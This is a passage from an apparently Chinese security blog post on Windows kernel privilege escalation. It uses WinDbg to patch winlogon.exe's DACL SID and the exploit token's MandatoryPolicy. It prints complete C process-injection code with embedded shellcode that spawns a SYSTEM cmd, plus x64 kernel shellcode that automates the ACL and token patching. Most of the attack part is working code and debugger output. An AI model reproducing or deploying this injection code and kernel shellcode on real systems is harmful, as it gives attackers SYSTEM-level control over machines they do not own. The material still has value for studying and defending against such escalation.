<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 定位到winlogon.exe进程的SecurityDescriptor</span><br><span class="line"><span class="number">2.</span> 从SecurityDescriptor中找到包含ACCESS_ALLOWED_ACE的DACL列表</span><br><span class="line"><span class="number">3.</span> 修改其中的sid为 S<span class="number">-1</span><span class="number">-5</span><span class="number">-11</span>, 所有经过身份认证的用户都是这个sid，这样就是当前的所有用户都有权限访问和修改此进程</span><br><span class="line"><span class="number">4.</span> 修改漏洞利用进程的MandatoryPolicy为<span class="number">0</span>，进行进程注入，获取system权限。</span><br></pre></td></tr></table></figure>

<p>为了修改ACL，我们先看一下相关的数据结构：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; dt _SECURITY_DESCRIPTOR </span><br><span class="line">nt!_SECURITY_DESCRIPTOR</span><br><span class="line">   +0x000 Revision         : UChar</span><br><span class="line">   +0x001 Sbz1             : UChar</span><br><span class="line">   +0x002 Control          : Uint2B</span><br><span class="line">   +0x008 Owner            : Ptr64 Void</span><br><span class="line">   +0x010 Group            : Ptr64 Void</span><br><span class="line">   +0x018 Sacl             : Ptr64 _ACL</span><br><span class="line">   +0x020 Dacl             : Ptr64 _ACL</span><br></pre></td></tr></table></figure>

<p>这里可以看到<code>Dacl</code>,它保存了对此对象有操作权限的用户，ACL的结构如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; dt _ACL </span><br><span class="line">nt!_ACL</span><br><span class="line">   +0x000 AclRevision      : UChar</span><br><span class="line">   +0x001 Sbz1             : UChar</span><br><span class="line">   +0x002 AclSize          : Uint2B</span><br><span class="line">   +0x004 AceCount         : Uint2B</span><br><span class="line">   +0x006 Sbz2             : Uint2B</span><br></pre></td></tr></table></figure>

<p>可以说明这个<code>_ACL</code>其实只存储了数据头部，后买你才是真实存储的ACL数据。在DACL中有两种ACE，分别是<code>ACCESS_ALLOWED_ACE</code>和<code>ACCESS_DENIED_ACE</code>,我们接下来就开始修改<code>ACCESS_ALLOWED_ACE</code>,实现让任意用户都有访权限。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">ACCESS_ALLOWED_ACE</span> &#123;</span></span><br><span class="line">  ACE_HEADER  Header;</span><br><span class="line">  ACCESS_MASK Mask;</span><br><span class="line">  DWORD       SidStart;</span><br><span class="line">&#125; ACCESS_ALLOWED_ACE;</span><br></pre></td></tr></table></figure>

<p>接下来就来看一下这个具体的<code>SecurityDescriptor</code> 是长什么样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; !process 0 0 winlogon.exe</span><br><span class="line">PROCESS ffffb78f2b0d3140</span><br><span class="line">    SessionId: 1  Cid: 0260    Peb: 6336452000  ParentCid: 01f8</span><br><span class="line">    DirBase: 12b8fd002  ObjectTable: ffff900849cfc180  HandleCount: 259.</span><br><span class="line">    Image: winlogon.exe</span><br><span class="line"></span><br><span class="line">0: kd&gt; dt _OBJECT_HEADER ffffb78f2b0d3140-30  SecurityDescriptor</span><br><span class="line">nt!_OBJECT_HEADER</span><br><span class="line">   +0x028 SecurityDescriptor : 0xffff9008&#96;464082a2 Void</span><br><span class="line">0: kd&gt; !sd 0xffff9008&#96;464082a2</span><br><span class="line">30000000140000: Unable to get MIN SID header</span><br><span class="line">30000000140000: Unable to read in Owner in SD</span><br><span class="line">0: kd&gt; !sd 0xffff9008&#96;464082a0 </span><br><span class="line">-&gt;Revision: 0x1</span><br><span class="line">-&gt;Sbz1    : 0x0</span><br><span class="line">-&gt;Control : 0x8814</span><br><span class="line">            SE_DACL_PRESENT</span><br><span class="line">            SE_SACL_PRESENT</span><br><span class="line">            SE_SACL_AUTO_INHERITED</span><br><span class="line">            SE_SELF_RELATIVE</span><br><span class="line">-&gt;Owner   : S-1-5-32-544</span><br><span class="line">-&gt;Group   : S-1-5-18</span><br><span class="line">-&gt;Dacl    : </span><br><span class="line">-&gt;Dacl    : -&gt;AclRevision: 0x2</span><br><span class="line">-&gt;Dacl    : -&gt;Sbz1       : 0x0</span><br><span class="line">-&gt;Dacl    : -&gt;AclSize    : 0x3c</span><br><span class="line">-&gt;Dacl    : -&gt;AceCount   : 0x2</span><br><span class="line">-&gt;Dacl    : -&gt;Sbz2       : 0x0</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;AceType: ACCESS_ALLOWED_ACE_TYPE</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;AceFlags: 0x0</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;AceSize: 0x14</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;Mask : 0x001fffff</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;SID: S-1-5-18</span><br><span class="line"></span><br><span class="line">-&gt;Dacl    : -&gt;Ace[1]: -&gt;AceType: ACCESS_ALLOWED_ACE_TYPE</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[1]: -&gt;AceFlags: 0x0</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[1]: -&gt;AceSize: 0x18</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[1]: -&gt;Mask : 0x00121411</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[1]: -&gt;SID: S-1-5-32-544</span><br><span class="line"></span><br><span class="line">-&gt;Sacl    : </span><br><span class="line">-&gt;Sacl    : -&gt;AclRevision: 0x2</span><br><span class="line">-&gt;Sacl    : -&gt;Sbz1       : 0x0</span><br><span class="line">-&gt;Sacl    : -&gt;AclSize    : 0x1c</span><br><span class="line">-&gt;Sacl    : -&gt;AceCount   : 0x1</span><br><span class="line">-&gt;Sacl    : -&gt;Sbz2       : 0x0</span><br><span class="line">-&gt;Sacl    : -&gt;Ace[0]: -&gt;AceType: SYSTEM_MANDATORY_LABEL_ACE_TYPE</span><br><span class="line">-&gt;Sacl    : -&gt;Ace[0]: -&gt;AceFlags: 0x0</span><br><span class="line">-&gt;Sacl    : -&gt;Ace[0]: -&gt;AceSize: 0x14</span><br><span class="line">-&gt;Sacl    : -&gt;Ace[0]: -&gt;Mask : 0x00000003</span><br><span class="line">-&gt;Sacl    : -&gt;Ace[0]: -&gt;SID: S-1-16-16384</span><br></pre></td></tr></table></figure>

<p>DACL有两项ACE，<code>S-1-5-18</code> 是 <code>LocalSystem</code> 用户，<code>S-1-5-32-544</code> 是administrator用户，但是这里需要注意的是 windbg给出的<code>_SECURITY_DESCRIPTOR</code>符号是错误，有大佬已经给我们指出了正确的偏移如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _SECURITY_DESCRIPTOR</span><br><span class="line">nt!_SECURITY_DESCRIPTOR</span><br><span class="line">   +0x000 Revision         : UChar</span><br><span class="line">   +0x001 Sbz1             : UChar</span><br><span class="line">   +0x002 Control          : Uint2B</span><br><span class="line">   +0x008 Owner            : Ptr64 Void</span><br><span class="line">   +0x010 Group            : Ptr64 Void</span><br><span class="line">   +0x018 Sacl             : Ptr64 _ACL</span><br><span class="line">   +0x020 Dacl             : Ptr64 _ACL   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; wrong symbol, it should be 0x30</span><br></pre></td></tr></table></figure>

<p>下面来查看一下DACL：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; dt _ACL 0xffff9008&#96;464082a0 + 0x30 </span><br><span class="line">nt!_ACL</span><br><span class="line">   +0x000 AclRevision      : 0x2 &#39;&#39;</span><br><span class="line">   +0x001 Sbz1             : 0 &#39;&#39;</span><br><span class="line">   +0x002 AclSize          : 0x3c</span><br><span class="line">   +0x004 AceCount         : 2</span><br><span class="line">   +0x006 Sbz2             : 0</span><br></pre></td></tr></table></figure>

<p>和我们刚才使用<code>!sd</code>命令打印出来的ACL头信息是一致的，但是这里只能看见头，观察一下这个数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-&gt;Dacl    : -&gt;AclRevision: 0x2</span><br><span class="line">-&gt;Dacl    : -&gt;Sbz1       : 0x0</span><br><span class="line">-&gt;Dacl    : -&gt;AclSize    : 0x3c</span><br><span class="line">-&gt;Dacl    : -&gt;AceCount   : 0x2</span><br><span class="line">-&gt;Dacl    : -&gt;Sbz2       : 0x0</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;AceType: ACCESS_ALLOWED_ACE_TYPE</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;AceFlags: 0x0</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;AceSize: 0x14</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;Mask : 0x001fffff</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;SID: S-1-5-18</span><br><span class="line"></span><br><span class="line">-&gt;Dacl    : -&gt;Ace[1]: -&gt;AceType: ACCESS_ALLOWED_ACE_TYPE</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[1]: -&gt;AceFlags: 0x0</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[1]: -&gt;AceSize: 0x18</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[1]: -&gt;Mask : 0x00121411</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[1]: -&gt;SID: S-1-5-32-544</span><br></pre></td></tr></table></figure>

<p><code>AclRevision,Sbz1,AclSize,AceCount,Sbz2</code>其实就是<code>_ACL</code>，占8个字节，接下来的每一个ACE都是以<code>AceType,AceFlags，AceSize</code>开始的，其实是<code>_ACE_HEADER</code>结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">ACE_HEADER</span> &#123;</span></span><br><span class="line">  BYTE AceType;</span><br><span class="line">  BYTE AceFlags;</span><br><span class="line">  WORD AceSize;</span><br><span class="line">&#125; ACE_HEADER;</span><br></pre></td></tr></table></figure>

<p>占4个字节，最后是<code>Mask</code>占4个字节，所以偏移0x10的位置就有一个sid。</p>
<p>我们dump一下数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; dd 0xffff9008&#96;464082a0 + 0x30 </span><br><span class="line">ffff9008&#96;464082d0  003c0002 00000002 00140000 001fffff</span><br><span class="line">ffff9008&#96;464082e0  00000101 05000000 00000012 00180000</span><br><span class="line">ffff9008&#96;464082f0  00121411 00000201 05000000 00000020</span><br></pre></td></tr></table></figure>

<p><code>00000101 05000000 00000012</code> 就表示的sid:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; dt _sid</span><br><span class="line">nt!_SID</span><br><span class="line">   +0x000 Revision         : UChar</span><br><span class="line">   +0x001 SubAuthorityCount : UChar</span><br><span class="line">   +0x002 IdentifierAuthority : _SID_IDENTIFIER_AUTHORITY</span><br><span class="line">   +0x008 SubAuthority     : [1] Uint4B</span><br><span class="line">0: kd&gt; dt _sid  0xffff9008&#96;464082a0 + 0x40</span><br><span class="line">nt!_SID</span><br><span class="line">   +0x000 Revision         : 0x1 &#39;&#39;</span><br><span class="line">   +0x001 SubAuthorityCount : 0x1 &#39;&#39;</span><br><span class="line">   +0x002 IdentifierAuthority : _SID_IDENTIFIER_AUTHORITY</span><br><span class="line">   +0x008 SubAuthority     : [1] 0x12</span><br></pre></td></tr></table></figure>

<p>对应的值刚好就是<code>1-5-18</code>，将其修改为<code>1-5-11</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; db 0xffff9008&#96;464082a0 + 0x48 L1 </span><br><span class="line">ffff9008&#96;464082e8  12                                               .</span><br><span class="line">0: kd&gt; eb 0xffff9008&#96;464082a0 + 0x48 b</span><br></pre></td></tr></table></figure>

<p>接下里使用查看一下此进程的权限：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; !sd 0xffff9008&#96;464082a0 </span><br><span class="line">-&gt;Revision: 0x1</span><br><span class="line">-&gt;Sbz1    : 0x0</span><br><span class="line">-&gt;Control : 0x8814</span><br><span class="line">            SE_DACL_PRESENT</span><br><span class="line">            SE_SACL_PRESENT</span><br><span class="line">            SE_SACL_AUTO_INHERITED</span><br><span class="line">            SE_SELF_RELATIVE</span><br><span class="line">-&gt;Owner   : S-1-5-32-544</span><br><span class="line">-&gt;Group   : S-1-5-18</span><br><span class="line">-&gt;Dacl    : </span><br><span class="line">-&gt;Dacl    : -&gt;AclRevision: 0x2</span><br><span class="line">-&gt;Dacl    : -&gt;Sbz1       : 0x0</span><br><span class="line">-&gt;Dacl    : -&gt;AclSize    : 0x3c</span><br><span class="line">-&gt;Dacl    : -&gt;AceCount   : 0x2</span><br><span class="line">-&gt;Dacl    : -&gt;Sbz2       : 0x0</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;AceType: ACCESS_ALLOWED_ACE_TYPE</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;AceFlags: 0x0</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;AceSize: 0x14</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;Mask : 0x001fffff</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;SID: S-1-5-11</span><br></pre></td></tr></table></figure>

<p>修改成功了，当前的winlogon.exe已经可以被任意进程访问了。</p>
<h3 id="注入验证"><a href="#注入验证" class="headerlink" title="注入验证"></a>注入验证</h3><p>接下来就要尝试注入<code>winlogon.exe</code>,弹出system权限的shell。写如下代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ConsoleApplication3.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">getProcessId</span><span class="params">(WCHAR* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hProcessSnap;</span><br><span class="line">	PROCESSENTRY32 pe32;</span><br><span class="line">	DWORD PID;</span><br><span class="line"></span><br><span class="line">	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">	<span class="keyword">if</span> (!Process32First(hProcessSnap, &amp;pe32))</span><br><span class="line">	&#123;</span><br><span class="line">		CloseHandle(hProcessSnap);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!wcscmp(pe32.szExeFile, str))</span><br><span class="line">		&#123;</span><br><span class="line">			PID = pe32.th32ProcessID;</span><br><span class="line">			<span class="keyword">return</span> PID;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">while</span> (Process32Next(hProcessSnap, &amp;pe32));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">injectCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span>* pMem;</span><br><span class="line">	WCHAR str[] = <span class="string">L"winlogon.exe"</span>;</span><br><span class="line">	HANDLE hEx = <span class="literal">NULL</span>;</span><br><span class="line">	CHAR shellcode[] = <span class="string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span></span><br><span class="line">		<span class="string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span></span><br><span class="line">		<span class="string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span></span><br><span class="line">		<span class="string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span></span><br><span class="line">		<span class="string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span></span><br><span class="line">		<span class="string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span></span><br><span class="line">		<span class="string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span></span><br><span class="line">		<span class="string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span></span><br><span class="line">		<span class="string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span></span><br><span class="line">		<span class="string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span></span><br><span class="line">		<span class="string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span></span><br><span class="line">		<span class="string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span></span><br><span class="line">		<span class="string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span></span><br><span class="line">		<span class="string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span></span><br><span class="line">		<span class="string">"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"</span></span><br><span class="line">		<span class="string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span></span><br><span class="line">		<span class="string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"</span></span><br><span class="line">		<span class="string">"\x00"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">		DWORD pid = getProcessId(str);</span><br><span class="line">		hEx = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">		<span class="keyword">if</span> (hEx == <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"Error opening winlogon process: %d\n"</span>, GetLastError());</span><br><span class="line">		    <span class="comment">// return FALSE;</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	pMem = VirtualAllocEx(hEx, <span class="literal">NULL</span>, <span class="number">0x1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (pMem == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Error allocating space in winlogon process: %d\n"</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!WriteProcessMemory(hEx, pMem, shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="number">0</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Error writing shellcode: %d\n"</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!CreateRemoteThread(hEx, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pMem, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Error starting thread: %d\n"</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Remote thread created\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     injectCode();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于普通用户进程是没有权限打开<code>winlogon</code>进程的，所以会一直打开失败而陷入死循环，然后我们在windbg中调整权限，让winlogon.exe可以被普通权限打开。</p>
<p>但是调整完成后，依然无法打开进程，这是因为winlogon.exe具有比较高的完整性界别，而我们的程序的完整性级别比较低，无法写完整性级别较高的进程。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_mandatory_policy" target="_blank" rel="noopener">msdn文档</a>。我们调整我们的漏洞利用程序的<code>MandatoryPolicy</code>为0即可。</p>
<table>
<thead>
<tr>
<th align="left">Value</th>
<th align="left">Meaning</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>TOKEN_MANDATORY_POLICY_OFF</strong>0x0</td>
<td align="left">No mandatory integrity policy is enforced for the token.</td>
</tr>
<tr>
<td align="left"><strong>TOKEN_MANDATORY_POLICY_NO_WRITE_UP</strong>0x1</td>
<td align="left">A process associated with the token cannot write to objects that have a greater mandatory integrity level.</td>
</tr>
<tr>
<td align="left"><strong>TOKEN_MANDATORY_POLICY_NEW_PROCESS_MIN</strong>0x2</td>
<td align="left">A process created with the token has an integrity level that is the lesser of the parent-process integrity level and the executable-file integrity level.</td>
</tr>
<tr>
<td align="left"><strong>TOKEN_MANDATORY_POLICY_VALID_MASK</strong>0x3</td>
<td align="left">A combination of <strong>TOKEN_MANDATORY_POLICY_NO_WRITE_UP</strong> and <strong>TOKEN_MANDATORY_POLICY_NEW_PROCESS_MIN</strong>.</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; dt _token   (poi(ffffb78f2d4240c0+0x360)&amp;0xFFFFFFFFFFFFFFF0 ) </span><br><span class="line">nt!_TOKEN</span><br><span class="line">   +0x000 TokenSource      : _TOKEN_SOURCE</span><br><span class="line">   +0x010 TokenId          : _LUID</span><br><span class="line">   +0x018 AuthenticationId : _LUID</span><br><span class="line">   +0x020 ParentTokenId    : _LUID</span><br><span class="line">   +0x028 ExpirationTime   : _LARGE_INTEGER 0x7fffffff&#96;ffffffff</span><br><span class="line">   +0x030 TokenLock        : 0xffffb78f&#96;2e705b10 _ERESOURCE</span><br><span class="line">   +0x038 ModifiedId       : _LUID</span><br><span class="line">   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES</span><br><span class="line">   +0x058 AuditPolicy      : _SEP_AUDIT_POLICY</span><br><span class="line">   +0x078 SessionId        : 1</span><br><span class="line">   +0x07c UserAndGroupCount : 0xf</span><br><span class="line">   +0x080 RestrictedSidCount : 0</span><br><span class="line">   +0x084 VariableLength   : 0x1dc</span><br><span class="line">   +0x088 DynamicCharged   : 0x1000</span><br><span class="line">   +0x08c DynamicAvailable : 0</span><br><span class="line">   +0x090 DefaultOwnerIndex : 4</span><br><span class="line">   +0x098 UserAndGroups    : 0xffff9008&#96;4a3bfdc0 _SID_AND_ATTRIBUTES</span><br><span class="line">   +0x0a0 RestrictedSids   : (null) </span><br><span class="line">   +0x0a8 PrimaryGroup     : 0xffff9008&#96;4f055290 Void</span><br><span class="line">   +0x0b0 DynamicPart      : 0xffff9008&#96;4f055290  -&gt; 0x501</span><br><span class="line">   +0x0b8 DefaultDacl      : 0xffff9008&#96;4f0552ac _ACL</span><br><span class="line">   +0x0c0 TokenType        : 1 ( TokenPrimary )</span><br><span class="line">   +0x0c4 ImpersonationLevel : 0 ( SecurityAnonymous )</span><br><span class="line">   +0x0c8 TokenFlags       : 0x2000</span><br><span class="line">   +0x0cc TokenInUse       : 0x1 &#39;&#39;</span><br><span class="line">   +0x0d0 IntegrityLevelIndex : 0xe</span><br><span class="line">   +0x0d4 MandatoryPolicy  : 3</span><br></pre></td></tr></table></figure>

<p>进行修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; eb ffff9008&#96;4a3bf930+0x0d4 0</span><br><span class="line">0: kd&gt; dt _token   (poi(ffffb78f2d4240c0+0x360)&amp;0xFFFFFFFFFFFFFFF0 ) </span><br><span class="line">nt!_TOKEN</span><br><span class="line">   +0x000 TokenSource      : _TOKEN_SOURCE</span><br><span class="line">   +0x010 TokenId          : _LUID</span><br><span class="line">   +0x018 AuthenticationId : _LUID</span><br><span class="line">   +0x020 ParentTokenId    : _LUID</span><br><span class="line">   +0x028 ExpirationTime   : _LARGE_INTEGER 0x7fffffff&#96;ffffffff</span><br><span class="line">   +0x030 TokenLock        : 0xffffb78f&#96;2e705b10 _ERESOURCE</span><br><span class="line">   +0x038 ModifiedId       : _LUID</span><br><span class="line">   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES</span><br><span class="line">   +0x058 AuditPolicy      : _SEP_AUDIT_POLICY</span><br><span class="line">   +0x078 SessionId        : 1</span><br><span class="line">   +0x07c UserAndGroupCount : 0xf</span><br><span class="line">   +0x080 RestrictedSidCount : 0</span><br><span class="line">   +0x084 VariableLength   : 0x1dc</span><br><span class="line">   +0x088 DynamicCharged   : 0x1000</span><br><span class="line">   +0x08c DynamicAvailable : 0</span><br><span class="line">   +0x090 DefaultOwnerIndex : 4</span><br><span class="line">   +0x098 UserAndGroups    : 0xffff9008&#96;4a3bfdc0 _SID_AND_ATTRIBUTES</span><br><span class="line">   +0x0a0 RestrictedSids   : (null) </span><br><span class="line">   +0x0a8 PrimaryGroup     : 0xffff9008&#96;4f055290 Void</span><br><span class="line">   +0x0b0 DynamicPart      : 0xffff9008&#96;4f055290  -&gt; 0x501</span><br><span class="line">   +0x0b8 DefaultDacl      : 0xffff9008&#96;4f0552ac _ACL</span><br><span class="line">   +0x0c0 TokenType        : 1 ( TokenPrimary )</span><br><span class="line">   +0x0c4 ImpersonationLevel : 0 ( SecurityAnonymous )</span><br><span class="line">   +0x0c8 TokenFlags       : 0x2000</span><br><span class="line">   +0x0cc TokenInUse       : 0x1 &#39;&#39;</span><br><span class="line">   +0x0d0 IntegrityLevelIndex : 0xe</span><br><span class="line">   +0x0d4 MandatoryPolicy  : 0</span><br></pre></td></tr></table></figure>

<p>提权成功。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/20210822164005.png" alt=""></p>
<h3 id="写shellcode-1"><a href="#写shellcode-1" class="headerlink" title="写shellcode"></a>写shellcode</h3><p>不再解释了，直接贴一下shellcode吧。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov rax, [gs:0x188]                  ;stores KTHREAD value</span><br><span class="line">mov rax, [rax+0x220]                 ;stores EPROCESS as an offset to KTHREAD</span><br><span class="line">mov rcx, rax                         ;stores EPROCESS in rcx</span><br><span class="line">mov rax, [rax+0x2f0]                 ;stores the next linked list pointer into rax</span><br><span class="line">procloop:</span><br><span class="line">  lea rbx, [rax-0x2f0]               ;stores EPROCESS address in rbx</span><br><span class="line">  mov rax, [rax]                     ;stores  linked list pointer into rax</span><br><span class="line">  add rbx, 0x450                     ;Get EPROCESS&#39;s ImageFileName</span><br><span class="line">  cmp dword [rbx], 0x6c6e6977        ;compare it to &quot;lniw&quot; (winl)</span><br><span class="line">  jne procloop                       ;if not equal repeat the drill</span><br><span class="line">sub rbx, 0x450                       ;get EPROCESS of winlogon in rbx</span><br><span class="line">sub rbx, 0x30                        ;get object_header</span><br><span class="line">add rbx, 0x28                        ;get SecurityDescriptor</span><br><span class="line">mov rax, [rbx]                       ;save SecurityDescriptor in rax</span><br><span class="line">and rax, 0x0FFFFFFFFFFFFFFF0         ;zero SecurityDescriptor last 4 bits.</span><br><span class="line">add rax, 0x48                        ;get the ACL[0] SID </span><br><span class="line">mov byte [rax], 0x0b                 ;Change it to 0x0b (This Organization)</span><br><span class="line">add rcx, 0x360                       ;Access current process token structure</span><br><span class="line">mov rax, [rcx]                       ;save token in rax</span><br><span class="line">and rax, 0x0FFFFFFFFFFFFFFF0         ;remove the last nibble (fast reference)</span><br><span class="line">add rax, 0x0d4                       ;Access the MandatorySecurityPolicy</span><br><span class="line">mov byte [rax], 0                    ;change it to zero.</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>在kscldr.exe中添加注入的代码就可以成功的弹出system权限的shell。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/20210822190637.png" alt=""></p>
